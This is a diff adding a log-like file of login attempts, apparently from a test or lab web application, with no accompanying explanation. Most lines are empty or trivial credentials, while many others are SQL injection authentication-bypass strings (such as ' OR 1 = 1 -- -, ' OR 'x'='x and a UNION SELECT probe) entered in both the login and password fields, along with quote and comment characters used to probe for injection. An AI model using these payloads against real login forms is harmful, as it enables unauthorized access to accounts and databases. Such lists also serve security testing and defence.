@@ -1,0 +1,168 @@
+
+Login: 	Password: 
+Login: test	Password: 1234
+Login: 	Password: 
+Login: 	Password: 
+Login: 	Password: 
+Login: 	Password: 
+Login: 	Password: 
+Login: " OR 1 = 1 -- -	Password: 
+Login: 	Password: 
+Login: 	Password: " OR 1 = 1 -- -
+Login: " OR 1 = 1 -- -	Password: 
+Login: 	Password: 
+Login: 	Password: " OR 1 = 1 -- -
+Login: " OR 1 = 1 -- -	Password: 
+Login: 	Password: 
+Login: 	Password: " OR 1 = 1 -- -
+Login: " OR 1 = 1 -- -	Password: 
+Login: 	Password: 
+Login: 	Password: " OR 1 = 1 -- -
+Login: 	Password: 
+Login: 	Password: 
+Login: 	Password: 
+Login: " OR 1 = 1 -- -	Password: 
+Login: 	Password: 
+Login: ' or "	Password: 
+Login: 	Password: 
+Login: ' OR '1	Password: 
+Login: 	Password: 
+Login: ' OR 1 -- -	Password: 
+Login: 	Password: 
+Login: " OR "" = "	Password: 
+Login: 	Password: 
+Login: 	Password: " OR 1 = 1 -- -
+Login: 	Password: 
+Login: 	Password: ' or "
+Login: 	Password: 
+Login: 	Password: ' OR '1
+Login: 	Password: 
+Login: 	Password: ' OR 1 -- -
+Login: 	Password: 
+Login: 	Password: " OR "" = "
+Login: 	Password: 
+Login: 	Password: 
+Login: 	Password: 
+Login: " OR 1 = 1 -- -	Password: 
+Login: 	Password: 
+Login: ' or "	Password: 
+Login: 	Password: 
+Login: ' OR '1	Password: 
+Login: 	Password: 
+Login: ' OR 1 -- -	Password: 
+Login: 	Password: 
+Login: " OR "" = "	Password: 
+Login: 	Password: 
+Login: '	Password: 
+Login: 	Password: 
+Login: ''	Password: 
+Login: 	Password: 
+Login: `	Password: 
+Login: 	Password: 
+Login: ``	Password: 
+Login: 	Password: 
+Login: ,	Password: 
+Login: 	Password: 
+Login: "	Password: 
+Login: 	Password: 
+Login: ""	Password: 
+Login: 	Password: 
+Login: /	Password: 
+Login: 	Password: 
+Login: //	Password: 
+Login: 	Password: 
+Login: \	Password: 
+Login: 	Password: 
+Login: \\	Password: 
+Login: 	Password: 
+Login: ;	Password: 
+Login: 	Password: 
+Login: ' or "	Password: 
+Login: 	Password: 
+Login: -- or # 	Password: 
+Login: 	Password: 
+Login: ' OR '1	Password: 
+Login: 	Password: 
+Login: ' OR 1 -- -	Password: 
+Login: 	Password: 
+Login: " OR "" = "	Password: 
+Login: 	Password: 
+Login: " OR 1 = 1 -- -	Password: 
+Login: 	Password: 
+Login: ' OR '' = '	Password: 
+Login: 	Password: 
+Login: '='	Password: 
+Login: 	Password: 
+Login: 'LIKE'	Password: 
+Login: 	Password: 
+Login: '=0--+	Password: 
+Login: 	Password: 
+Login:  OR 1=1	Password: 
+Login: 	Password: 
+Login: ' OR 'x'='x	Password: 
+Login: 	Password: 
+Login: ' AND id IS NULL; --	Password: 
+Login: 	Password: 
+Login: '''''''''''''UNION SELECT '2	Password: 
+Login: 	Password: 
+Login: 	Password: " OR 1 = 1 -- -
+Login: 	Password: 
+Login: 	Password: ' or "
+Login: 	Password: 
+Login: 	Password: ' OR '1
+Login: 	Password: 
+Login: 	Password: ' OR 1 -- -
+Login: 	Password: 
+Login: 	Password: " OR "" = "
+Login: 	Password: 
+Login: 	Password: '
+Login: 	Password: 
+Login: 	Password: ''
+Login: 	Password: 
+Login: 	Password: `
+Login: 	Password: 
+Login: 	Password: ``
+Login: 	Password: 
+Login: 	Password: ,
+Login: 	Password: 
+Login: 	Password: "
+Login: 	Password: 
+Login: 	Password: ""
+Login: 	Password: 
+Login: 	Password: /
+Login: 	Password: 
+Login: 	Password: //
+Login: 	Password: 
+Login: 	Password: \
+Login: 	Password: 
+Login: 	Password: \\
+Login: 	Password: 
+Login: 	Password: ;
+Login: 	Password: 
+Login: 	Password: ' or "
+Login: 	Password: 
+Login: 	Password: -- or # 
+Login: 	Password: 
+Login: 	Password: ' OR '1
+Login: 	Password: 
+Login: 	Password: ' OR 1 -- -
+Login: 	Password: 
+Login: 	Password: " OR "" = "
+Login: 	Password: 
+Login: 	Password: " OR 1 = 1 -- -
+Login: 	Password: 
+Login: 	Password: ' OR '' = '
+Login: 	Password: 
+Login: 	Password: '='
+Login: 	Password: 
+Login: 	Password: 'LIKE'
+Login: 	Password: 
+Login: 	Password: '=0--+
+Login: 	Password: 
+Login: 	Password:  OR 1=1
+Login: 	Password: 
+Login: 	Password: ' OR 'x'='x
+Login: 	Password: 
+Login: 	Password: ' AND id IS NULL; --
+Login: 	Password: 
+Login: 	Password: '''''''''''''UNION SELECT '2
